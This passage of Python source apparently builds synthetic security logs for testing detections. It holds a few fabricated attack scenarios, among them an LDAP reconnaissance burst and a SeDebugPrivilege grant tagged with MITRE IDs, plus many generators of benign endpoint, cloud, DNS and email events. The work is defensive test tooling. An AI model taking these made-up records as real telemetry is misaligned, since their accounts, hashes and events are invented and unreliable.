                "DestinationPort": 389,
                "Protocol": "LDAP",
                "AccountUpn": "svc_deploy@corp.local",
                "AccountSid": "S-1-5-21-1234567890-1234567890-1234567890-1103",
                "AccountObjectId": None,
                "AccountDisplayName": "Deploy Service Account",
                "AccountName": "svc_deploy",
                "AccountDomain": "CORP",
                "DeviceName": "CORP-WS-001",
                "IPAddress": "10.0.0.10",
                "Port": 49152,
                "Location": None,
                "ISP": None,
                "CountryCode": None,
                "City": None,
                "AdditionalFields": '{"Privilege":"SeDebugPrivilege","GrantedBy":"svc_deploy"}',
            },
        ],
    },
    "ldap-recon": {
        "table": "IdentityQueryEvents",
        "mitre": ["T1087.002", "T1069.002"],
        "detection_rules": ["SYN-0029"],
        # 60 rapid LDAP searches — attacker enumerating AD users and groups
        "events": [
            {
                "ActionType": "LdapSearch",
                "Application": "Active Directory",
                "QueryType": "LDAP",
                "QueryTarget": "DC=corp,DC=local",
                "Protocol": "LDAP",
                "AccountUpn": "jsmith@corp.local",
                "AccountSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
                "AccountObjectId": None,
                "AccountDisplayName": "John Smith",
                "AccountName": "jsmith",
                "AccountDomain": "CORP",
                "DeviceName": "CORP-WS-001",
                "IPAddress": "10.0.0.10",
                "Port": 49152 + i,
                "DestinationDeviceName": "SRV-DC01",
                "DestinationIPAddress": "10.0.0.1",
                "DestinationPort": 389,
                "AdditionalFields": f'{{"filter":"(objectClass=user)","scope":"subtree","count":{i + 1}}}',
            }
            for i in range(60)
        ],
    },
}


def _random_sha256(rng: random.Random) -> str:
    return "".join(rng.choices("0123456789abcdef", k=64))


def _random_timestamp(base: datetime, offset_minutes: int, rng: random.Random) -> str:
    """Generate a realistic timestamp with small random jitter."""
    jitter = timedelta(seconds=rng.randint(0, 30))
    ts = base + timedelta(minutes=offset_minutes) + jitter
    return ts.isoformat()


def _generate_benign_process_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    proc_name, proc_path = rng.choice(_BENIGN_PROCESSES)
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "ProcessCreated",
        "FileName": proc_name,
        "FolderPath": proc_path,
        "SHA256": _random_sha256(rng),
        "MD5": "".join(rng.choices("0123456789abcdef", k=32)),
        "ProcessId": rng.randint(1000, 65535),
        "ProcessCommandLine": rng.choice(_BENIGN_CMDLINES),
        "AccountDomain": domain,
        "AccountName": user,
        "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
        "LogonId": f"0x{rng.randint(100000, 999999):x}",
        "InitiatingProcessId": rng.randint(100, 9999),
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "C:\\Windows\\Explorer.EXE",
        "InitiatingProcessParentFileName": "userinit.exe",
        "InitiatingProcessAccountName": user,
        "InitiatingProcessSHA256": _random_sha256(rng),
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_network_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    remote_ips = ["8.8.8.8", "1.1.1.1", "13.107.42.14", "52.114.132.73", "40.90.4.128"]
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "ConnectionSuccess",
        "RemoteIP": rng.choice(remote_ips),
        "RemotePort": rng.choice([80, 443, 8080, 8443]),
        "RemoteUrl": f"https://cdn.example.com/resource/{rng.randint(1000,9999)}",
        "LocalIP": f"10.0.1.{rng.randint(10,200)}",
        "LocalPort": rng.randint(49152, 65535),
        "Protocol": "TCP",
        "InitiatingProcessFileName": "chrome.exe",
        "InitiatingProcessCommandLine": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"',
        "InitiatingProcessAccountName": user,
        "InitiatingProcessId": rng.randint(1000, 65535),
        "InitiatingProcessSHA256": _random_sha256(rng),
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_logon_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "LogonSuccess",
        "AccountDomain": domain,
        "AccountName": user,
        "AccountSid": f"S-1-5-21-{rng.randint(100000,999999)}-{rng.randint(100000,999999)}-{rng.randint(1000,9999)}-1001",
        "LogonType": 2,
        "LogonTypeName": "Interactive",
        "IsLocalAdmin": False,
        "FailureReason": None,
        "RemoteIP": None,
        "RemoteDeviceName": None,
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_registry_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    benign_keys = [
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs",
        "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Common\\Internet\\Server Cache",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
    ]
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "RegistryValueSet",
        "RegistryKey": rng.choice(benign_keys),
        "RegistryValueName": f"MRU{rng.randint(0, 10)}",
        "RegistryValueData": "C:\\Users\\jsmith\\Documents\\report.docx",
        "InitiatingProcessFileName": "explorer.exe",
        "InitiatingProcessCommandLine": "C:\\Windows\\Explorer.EXE",
        "InitiatingProcessAccountName": user,
        "InitiatingProcessId": rng.randint(1000, 9999),
        "ReportId": str(uuid.uuid4()),
    }


_AWS_ACCOUNTS = ["123456789012", "234567890123", "345678901234"]
_AWS_REGIONS = ["us-east-1", "us-west-2", "eu-west-1", "ap-southeast-1"]
_AWS_SERVICES = [
    "s3.amazonaws.com", "ec2.amazonaws.com", "iam.amazonaws.com",
    "rds.amazonaws.com", "lambda.amazonaws.com", "cloudwatch.amazonaws.com",
]
_AWS_READ_OPS = [
    ("DescribeInstances", "ec2.amazonaws.com"),
    ("ListBuckets", "s3.amazonaws.com"),
    ("GetObject", "s3.amazonaws.com"),
    ("DescribeDBInstances", "rds.amazonaws.com"),
    ("ListFunctions", "lambda.amazonaws.com"),
    ("GetMetricStatistics", "cloudwatch.amazonaws.com"),
    ("ListUsers", "iam.amazonaws.com"),
    ("GetCallerIdentity", "sts.amazonaws.com"),
]
_CF_DOMAINS = ["api.corp.com", "www.corp.com", "cdn.corp.com", "app.corp.com"]
_CF_PATHS = ["/", "/api/v1/users", "/api/v1/products", "/static/main.js", "/favicon.ico"]
_ZS_USERS = ["alice@corp.com", "bob@corp.com", "charlie@corp.com", "diana@corp.com"]
_ZS_URLS = [
    ("https://www.google.com", "google.com"),
    ("https://microsoft.com/updates", "microsoft.com"),
    ("https://github.com/repos", "github.com"),
    ("https://slack.com/api/rtm", "slack.com"),
    ("https://www.linkedin.com/feed", "linkedin.com"),
]
_ZS_DNS_DOMAINS = [
    "www.google.com", "microsoft.com", "github.com",
    "slack.com", "teams.microsoft.com", "outlook.office365.com",
]

# Value pools for DeviceImageLoadEvents, DeviceInfo, DeviceNetworkInfo, DeviceFileCertificateInfo
_SIGNED_DLLS = [
    ("ntdll.dll",     "C:\\Windows\\System32\\ntdll.dll"),
    ("kernel32.dll",  "C:\\Windows\\System32\\kernel32.dll"),
    ("advapi32.dll",  "C:\\Windows\\System32\\advapi32.dll"),
    ("user32.dll",    "C:\\Windows\\System32\\user32.dll"),
    ("ole32.dll",     "C:\\Windows\\System32\\ole32.dll"),
    ("shell32.dll",   "C:\\Windows\\System32\\shell32.dll"),
    ("msvcrt.dll",    "C:\\Windows\\System32\\msvcrt.dll"),
    ("crypt32.dll",   "C:\\Windows\\System32\\crypt32.dll"),
    ("wininet.dll",   "C:\\Windows\\System32\\wininet.dll"),
    ("ws2_32.dll",    "C:\\Windows\\System32\\ws2_32.dll"),
]
_MSFT_SIGNERS = [
    "Microsoft Corporation",
    "Microsoft Windows",
    "Microsoft Windows Publisher",
]
_MSFT_ISSUERS = [
    "Microsoft Code Signing PCA 2011",
    "Microsoft Windows Production PCA 2011",
]
_OS_PLATFORMS = [
    "Windows10", "Windows11", "WindowsServer2019", "WindowsServer2022",
]

# Value pools for MDO email tables
_MDO_SENDERS_BENIGN = [
    ("noreply@github.com",       "github.com"),
    ("billing@aws.amazon.com",   "aws.amazon.com"),
    ("no-reply@microsoft.com",   "microsoft.com"),
    ("notifications@slack.com",  "slack.com"),
    ("noreply@atlassian.com",    "atlassian.com"),
]
_MDO_SUBJECTS_BENIGN = [
    "Your monthly invoice",
    "New pull request review requested",
    "Meeting notes — weekly sync",
    "Security advisory notification",
    "Build notification: main passed",
]

# Value pools for identity tables
_LDAP_SEARCH_BASES = [
    "DC=corp,DC=local",
    "OU=Users,DC=corp,DC=local",
    "OU=Groups,DC=corp,DC=local",
    "CN=Computers,DC=corp,DC=local",
]
_IDENTITY_UPNS = [
    "jsmith@corp.local", "bjones@corp.local", "amartin@corp.local",
    "kwilliams@corp.local", "lmiller@corp.local", "dbrown@corp.local",
    "rdavis@corp.local", "cwilson@corp.local", "tmoore@corp.local",
]
_AD_GROUPS = ["Domain Users", "IT Staff", "HR Department", "Engineering", "Finance"]
_DCS = ["SRV-DC01", "SRV-DC02"]


def _generate_benign_cloudtrail_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    event_name, event_source = rng.choice(_AWS_READ_OPS)
    account_id = rng.choice(_AWS_ACCOUNTS)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "ManagementRead" if not event_source == "s3.amazonaws.com" else "DataAccess",
        "AccountId": account_id,
        "AccountName": None,
        "UserIdentityType": "IAMUser",
        "UserIdentityArn": f"arn:aws:iam::{account_id}:user/{user}",
        "UserIdentityName": user,
        "SessionName": None,
        "EventSource": event_source,
        "EventName": event_name,
        "EventCategory": "Management",
        "AWSRegion": rng.choice(_AWS_REGIONS),
        "SourceIPAddress": f"10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "UserAgent": rng.choice(["aws-cli/2.13.0", "python-boto3/1.28.0", "Terraform/1.5.0"]),
        "RequestParameters": None,
        "ResponseElements": None,
        "ErrorCode": None,
        "ErrorMessage": None,
        "ReadOnly": True,
        "MFAAuthenticated": True,
        "SharedEventID": None,
        "AdditionalFields": {},
    }


def _generate_benign_cloudflare_http_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "ReportId": f"cf{rng.randint(100000000, 999999999):x}",
        "ActionType": "HttpRequest",
        "ClientIP": f"203.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "ClientPort": rng.randint(1024, 65535),
        "ClientCountry": rng.choice(["US", "GB", "DE", "CA", "AU"]),
        "ClientASN": rng.randint(1000, 65000),
        "ClientASNDescription": "CORP-ISP",
        "ClientRequestMethod": rng.choice(["GET", "GET", "GET", "POST"]),
        "ClientRequestHost": rng.choice(_CF_DOMAINS),
        "ClientRequestURI": rng.choice(_CF_PATHS),
        "ClientRequestUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
        "ClientRequestReferer": None,
        "ClientRequestBytes": rng.randint(200, 2000),
        "ClientSSLProtocol": "TLSv1.3",
        "ClientSSLCipher": "AEAD-AES256-GCM-SHA384",
        "EdgeResponseStatus": rng.choice([200, 200, 200, 304, 301]),
        "EdgeResponseBytes": rng.randint(1000, 50000),
        "EdgeColoCode": rng.choice(["DFW", "LHR", "SIN", "FRA"]),
        "EdgeServerIP": None,
        "OriginIP": "192.0.2.10",
        "OriginResponseStatus": 200,
        "OriginResponseTime": rng.randint(1000000, 50000000),
        "CacheCacheStatus": rng.choice(["HIT", "HIT", "MISS", "EXPIRED"]),
        "CacheTieredFill": False,
        "FirewallMatchesActions": None,
        "FirewallMatchesRuleIDs": None,
        "BotScore": rng.randint(1, 20),
        "BotScoreSrc": "Verified Bot",
        "ThreatScore": 0,
        "WorkerSubrequest": False,
        "ZoneName": rng.choice(_CF_DOMAINS),
        "AdditionalFields": {},
    }


def _generate_benign_cloudflare_dns_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "DnsQuery",
        "SourceIP": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "SourcePort": rng.randint(1024, 65535),
        "DeviceID": str(uuid.uuid4()),
        "DeviceName": None,
        "UserID": None,
        "AccountName": None,
        "QueryName": rng.choice(_ZS_DNS_DOMAINS),
        "QueryType": rng.choice(["A", "A", "A", "AAAA", "MX"]),
        "QueryTypeName": None,
        "ResponseCode": "NOERROR",
        "ResolvedIPs": [f"142.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"],
        "ResolverDecision": "ALLOW",
        "ThreatCategory": None,
        "ThreatIndicator": None,
        "PolicyName": None,
        "PolicyID": None,
        "Blocked": False,
        "ResponseDurationMs": rng.randint(1, 30),
        "ZoneName": None,
        "Location": "HQ",
        "AdditionalFields": {},
    }


def _generate_benign_zscaler_web_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    url, host = rng.choice(_ZS_URLS)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "WebAllow",
        "UserName": rng.choice(_ZS_USERS),
        "Department": rng.choice(["Engineering", "Finance", "HR", "Sales"]),
        "Location": rng.choice(["HQ", "Branch-London", "Remote-VPN"]),
        "ClientIP": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "Protocol": "HTTPS",
        "RequestMethod": "GET",
        "RequestURL": url,
        "RequestHost": host,
        "RequestSize": rng.randint(200, 2000),
        "ResponseCode": 200,
        "ResponseSize": rng.randint(5000, 500000),
        "ResponseTime": rng.randint(50, 800),
        "ContentType": "text/html",
        "FileType": None,
        "FileName": None,
        "FileSHA256": None,
        "MalwareClass": None,
        "MalwareName": None,
        "ThreatCategory": None,
        "PolicyName": "Allow-Business",
        "RuleLabel": "allow-saas",
        "URLCategory": rng.choice(["Business and Economy", "Technology", "Social Networking"]),
        "CloudApplicationName": rng.choice(["Microsoft 365", "Google Workspace", "Slack"]),
        "CloudApplicationRisk": "Low",
        "SSLDecrypted": True,
        "DeviceOwner": "Managed",
        "DeviceName": device,
        "ServerIP": f"142.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "ServerPort": 443,
        "BytesIn": rng.randint(5000, 500000),
        "BytesOut": rng.randint(200, 5000),
        "DurationMs": rng.randint(50, 800),
        "AdditionalFields": {},
    }


def _generate_benign_zscaler_dns_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "ActionType": "DnsAllow",
        "UserName": rng.choice(_ZS_USERS),
        "Department": rng.choice(["Engineering", "Finance", "HR"]),
        "Location": "HQ",
        "ClientIP": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "QueryName": rng.choice(_ZS_DNS_DOMAINS),
        "QueryType": rng.choice(["A", "A", "AAAA"]),
        "ResponseCode": "NOERROR",
        "ResolvedIPs": [f"20.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}"],
        "CategoryName": "Technology",
        "ThreatName": None,
        "ThreatCategory": None,
        "PolicyName": None,
        "DeviceName": device,
        "DeviceOwner": "Managed",
        "DnsDurationMs": rng.randint(1, 20),
        "DoHStatus": False,
        "AdditionalFields": {},
    }


_PP_SENDERS_BENIGN = [
    ("it-alerts@vendor.com", "vendor.com"),
    ("newsletter@softwarenews.io", "softwarenews.io"),
    ("noreply@github.com", "github.com"),
    ("billing@aws.amazon.com", "aws.amazon.com"),
    ("no-reply@microsoft.com", "microsoft.com"),
]
_PP_RECIPIENTS = [
    "alice@corp.com", "bob@corp.com", "carol@corp.com",
    "dave@corp.com", "eve@corp.com",
]
_PP_SUBJECTS_BENIGN = [
    "Weekly digest: system alerts",
    "Your AWS bill for January 2024",
    "GitHub pull request review requested",
    "Monthly newsletter — January 2024",
    "Reminder: expense report due Friday",
]


def _generate_benign_proofpoint_message_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    sender_addr, sender_domain = rng.choice(_PP_SENDERS_BENIGN)
    recipient = rng.choice(_PP_RECIPIENTS)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "NetworkMessageId": f"{uuid.uuid4()}@{sender_domain}",
        "ActionType": "Delivered",
        "SenderFromAddress": sender_addr,
        "SenderFromDomain": sender_domain,
        "SenderIP": f"40.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "SenderReputation": "NeutralOrGood",
        "RecipientEmailAddress": recipient,
        "RecipientEmailAddresses": [recipient],
        "Subject": rng.choice(_PP_SUBJECTS_BENIGN),
        "MessageSize": rng.randint(2048, 20480),
        "SpamScore": float(rng.randint(0, 10)),
        "PhishScore": float(rng.randint(0, 5)),
        "ImpostorScore": float(rng.randint(0, 3)),
        "MalwareScore": 0.0,
        "SpamVerdict": "Negative",
        "PhishVerdict": "Negative",
        "MalwareVerdict": "Negative",
        "BulkVerdict": rng.choice(["Negative", "Positive"]),
        "DispositionAction": "deliver",
        "QuarantineFolder": None,
        "QuarantineRule": None,
        "PolicyRoutes": ["default-inbound"],
        "ModulesRun": ["pdr"],
        "ThreatsInfoMap": "[]",
        "AttachmentCount": 0,
        "AttachmentNames": None,
        "AttachmentTypes": None,
        "AttachmentSHA256": None,
        "UrlCount": rng.randint(0, 3),
        "HeaderFrom": sender_addr,
        "HeaderReplyTo": None,
        "XOriginatingIP": None,
        "DKIM": "pass",
        "DMARC": "pass",
        "SPF": "pass",
        "AdditionalFields": {},
    }


def _generate_benign_proofpoint_click_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    sender_addr, sender_domain = rng.choice(_PP_SENDERS_BENIGN)
    safe_urls = [
        ("https://github.com/notifications", "github.com"),
        ("https://aws.amazon.com/console", "aws.amazon.com"),
        ("https://microsoft.com/account/activity", "microsoft.com"),
    ]
    url, url_domain = rng.choice(safe_urls)
    recipient = rng.choice(_PP_RECIPIENTS)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "NetworkMessageId": f"{uuid.uuid4()}@{sender_domain}",
        "ActionType": "UrlPermitted",
        "RecipientEmailAddress": recipient,
        "SenderFromAddress": sender_addr,
        "SenderIP": f"40.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "Url": url,
        "UrlDomain": url_domain,
        "ThreatURL": None,
        "ThreatStatus": "cleared",
        "Classification": "spam",
        "ThreatTime": None,
        "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
        "ClickIP": f"10.{rng.randint(0,10)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "Blocked": False,
        "CampaignId": None,
        "AdditionalFields": {},
    }


def _generate_benign_cloudflare_firewall_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "ReportId": f"cf{rng.randint(100000000, 999999999):x}",
        "ActionType": "FirewallAllow",
        "ClientIP": f"203.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "ClientCountry": rng.choice(["US", "GB", "DE", "CA", "AU"]),
        "ClientASN": rng.randint(1000, 65000),
        "ClientRequestMethod": rng.choice(["GET", "GET", "POST"]),
        "ClientRequestHost": rng.choice(_CF_DOMAINS),
        "ClientRequestURI": rng.choice(_CF_PATHS),
        "ClientRequestUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120",
        "EdgeColoCode": rng.choice(["DFW", "LHR", "SIN"]),
        "FirewallAction": "allow",
        "FirewallRuleID": f"allow-{rng.randint(100,999)}",
        "FirewallRuleDescription": "Allow known good traffic",
        "FirewallSource": "firewallrules",
        "MatchIndex": 0,
        "Metadata": None,
        "OriginResponseStatus": 200,
        "SampledRate": 1.0,
        "ZoneName": rng.choice(_CF_DOMAINS),
        "AdditionalFields": {},
    }


def _generate_benign_image_load_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    dll_name, dll_path = rng.choice(_SIGNED_DLLS)
    proc_name, _ = rng.choice(_BENIGN_PROCESSES)
    signer = rng.choice(_MSFT_SIGNERS)
    issuer = rng.choice(_MSFT_ISSUERS)
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ActionType": "ImageLoaded",
        "FileName": dll_name,
        "FolderPath": dll_path,
        "SHA1": "".join(rng.choices("0123456789abcdef", k=40)),
        "SHA256": _random_sha256(rng),
        "MD5": "".join(rng.choices("0123456789abcdef", k=32)),
        "IsSigned": True,
        "IsCodeSigningCertValid": True,
        "Signer": signer,
        "SignerHash": "".join(rng.choices("0123456789abcdef", k=40)),
        "Issuer": issuer,
        "IssuerHash": "".join(rng.choices("0123456789abcdef", k=40)),
        "InitiatingProcessFileName": proc_name,
        "InitiatingProcessId": rng.randint(1000, 65535),
        "InitiatingProcessCommandLine": rng.choice(_BENIGN_CMDLINES),
        "InitiatingProcessAccountName": user,
        "InitiatingProcessSHA256": _random_sha256(rng),
        "InitiatingProcessParentId": rng.randint(100, 9999),
        "InitiatingProcessParentFileName": "explorer.exe",
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_device_info(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "ClientVersion": f"10.8560.{rng.randint(1000, 9999)}.0",
        "PublicIP": f"203.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "OSArchitecture": "x64",
        "OSPlatform": rng.choice(_OS_PLATFORMS),
        "OSBuild": rng.choice([19044, 19045, 22000, 22621, 22631, 17763, 20348]),
        "OSVersion": rng.choice(["10.0.19045", "10.0.22631", "10.0.22000", "10.0.17763"]),
        "OSDistribution": None,
        "OSVersionInfo": None,
        "IsAzureADJoined": True,
        "AadDeviceId": str(uuid.uuid4()),
        "LoggedOnUsers": f'[{{"UserName":"{user}","DomainName":"{domain}"}}]',
        "RegistryDeviceTag": None,
        "DeviceCategory": "Endpoint",
        "DeviceType": rng.choice(["Workstation", "Workstation", "Server"]),
        "DeviceSubtype": None,
        "MergedDeviceIds": None,
        "MergedToDeviceId": None,
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_device_network_info(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    mac = ":".join(f"{rng.randint(0, 255):02x}" for _ in range(6))
    local_ip = f"10.0.{rng.randint(0,10)}.{rng.randint(1,254)}"
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "NetworkAdapterId": str(uuid.uuid4()),
        "NetworkAdapterName": rng.choice(["Ethernet0", "Wi-Fi", "Local Area Connection"]),
        "MacAddress": mac,
        "NetworkAdapterType": rng.choice(["Ethernet", "WiFi", "Loopback"]),
        "NetworkAdapterStatus": "Up",
        "TunnelType": None,
        "IPv4Dhcp": "10.0.0.1",
        "IPv6Dhcp": None,
        "DefaultGateways": ["10.0.0.1"],
        "IPAddresses": f'[{{"IPAddress":"{local_ip}","SubnetPrefix":24}}]',
        "DNSAddresses": ["10.0.0.2", "10.0.0.3"],
        "ConnectedNetworks": None,
        "NetworkAdapterVendor": rng.choice(["Intel", "Realtek", "Broadcom"]),
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_file_certificate_info(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    signer = rng.choice(_MSFT_SIGNERS)
    issuer = rng.choice(_MSFT_ISSUERS)
    return {
        "Timestamp": ts,
        "DeviceId": str(uuid.uuid5(uuid.NAMESPACE_DNS, device)),
        "DeviceName": device,
        "SHA1": "".join(rng.choices("0123456789abcdef", k=40)),
        "IsSigned": True,
        "SignatureType": "Embedded",
        "IsCodeSigningCertValid": True,
        "Signer": signer,
        "SignerHash": "".join(rng.choices("0123456789abcdef", k=40)),
        "Issuer": issuer,
        "IssuerHash": "".join(rng.choices("0123456789abcdef", k=40)),
        "CertificateSerialNumber": "".join(rng.choices("0123456789abcdef", k=32)),
        "CrlDistributionPointUrls": ["http://crl.microsoft.com/pki/crl/products/MicCodSigPCA2011.crl"],
        "CertificateCreationTime": "2023-01-01T00:00:00+00:00",
        "CertificateExpirationTime": "2026-01-01T00:00:00+00:00",
        "CertificateCountersignatureTime": "2024-06-15T10:00:00+00:00",
        "IsRootSignerMicrosoft": True,
        "IsTestSigningEnabled": False,
        "ReportId": str(uuid.uuid4()),
    }


def _generate_benign_email_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    sender_addr, sender_domain = rng.choice(_MDO_SENDERS_BENIGN)
    recipient = rng.choice(_PP_RECIPIENTS)
    msg_id = f"{uuid.uuid4()}@{sender_domain}"
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "NetworkMessageId": msg_id,
        "InternetMessageId": f"<{msg_id}>",
        "SenderFromAddress": sender_addr,
        "SenderFromDomain": sender_domain,
        "SenderDisplayName": sender_domain.split(".")[0].capitalize(),
        "SenderIPv4": f"40.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
        "SenderIPv6": None,
        "SenderMailFromAddress": sender_addr,
        "SenderMailFromDomain": sender_domain,
        "RecipientEmailAddress": recipient,
        "RecipientObjectId": str(uuid.uuid4()),
        "Subject": rng.choice(_MDO_SUBJECTS_BENIGN),
        "ConfidenceLevel": "None",
        "DeliveryAction": "Delivered",
        "DeliveryLocation": "Inbox",
        "EmailActionPolicy": None,
        "EmailActionPolicyGuid": None,
        "AttachmentCount": rng.randint(0, 2),
        "UrlCount": rng.randint(0, 5),
        "EmailLanguage": "en",
        "AuthenticationDetails": '{"SPF":"pass","DKIM":"pass","DMARC":"pass","CompAuth":"pass"}',
        "ThreatNames": None,
        "ThreatTypes": None,
        "DetectionMethods": None,
        "OrgLevelPolicy": None,
        "OrgLevelAction": None,
        "UserLevelPolicy": None,
        "UserLevelAction": None,
        "Directionality": "Inbound",
        "Connectors": None,
    }


def _generate_benign_email_attachment_info(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    sender_addr, sender_domain = rng.choice(_MDO_SENDERS_BENIGN)
    safe_attachments = [
        ("invoice_jan2024.pdf",   "application/pdf"),
        ("quarterly_report.xlsx", "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
        ("meeting_notes.docx",    "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
        ("diagram.png",           "image/png"),
    ]
    filename, filetype = rng.choice(safe_attachments)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "NetworkMessageId": f"{uuid.uuid4()}@{sender_domain}",
        "SenderFromAddress": sender_addr,
        "RecipientEmailAddress": rng.choice(_PP_RECIPIENTS),
        "FileName": filename,
        "FileType": filetype,
        "SHA256": _random_sha256(rng),
        "MalwareFamily": None,
        "ThreatNames": None,
        "ThreatTypes": None,
        "DetectionMethods": None,
    }


def _generate_benign_email_post_delivery_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    # Benign: admin bulk-deleting newsletters or moving spam retroactively
    sender_addr, sender_domain = rng.choice(_MDO_SENDERS_BENIGN)
    msg_id = f"{uuid.uuid4()}@{sender_domain}"
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "NetworkMessageId": msg_id,
        "InternetMessageId": f"<{msg_id}>",
        "SenderFromAddress": sender_addr,
        "RecipientEmailAddress": rng.choice(_PP_RECIPIENTS),
        "RecipientObjectId": None,
        "DeliveryLocation": "JunkFolder",
        "Action": "Moved",
        "ActionType": "ManualRemediation",
        "ActionTrigger": "Admin",
        "ActionResult": "Success",
        "DeliveryTimestamp": None,
    }


def _generate_benign_email_url_info(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    sender_addr, sender_domain = rng.choice(_MDO_SENDERS_BENIGN)
    safe_urls = [
        ("https://github.com/notifications",       "github.com"),
        ("https://aws.amazon.com/console",         "aws.amazon.com"),
        ("https://microsoft.com/account/activity", "microsoft.com"),
        ("https://slack.com/archives",             "slack.com"),
        ("https://atlassian.net/jira/browse",      "atlassian.net"),
    ]
    url, url_domain = rng.choice(safe_urls)
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
        "NetworkMessageId": f"{uuid.uuid4()}@{sender_domain}",
        "Url": url,
        "UrlDomain": url_domain,
        "UrlLocation": rng.choice(["Body", "Body", "Header"]),
        "UrlChain": None,
    }


def _generate_benign_url_click_event(
    device: str, user: str, domain: str, ts: str, rng: random.Random
) -> dict[str, Any]:
    safe_urls = [
        "https://github.com/notifications",
        "https://microsoft.com/account/activity",
        "https://aws.amazon.com/console",
    ]
    return {
        "Timestamp": ts,
        "ReportId": str(uuid.uuid4()),
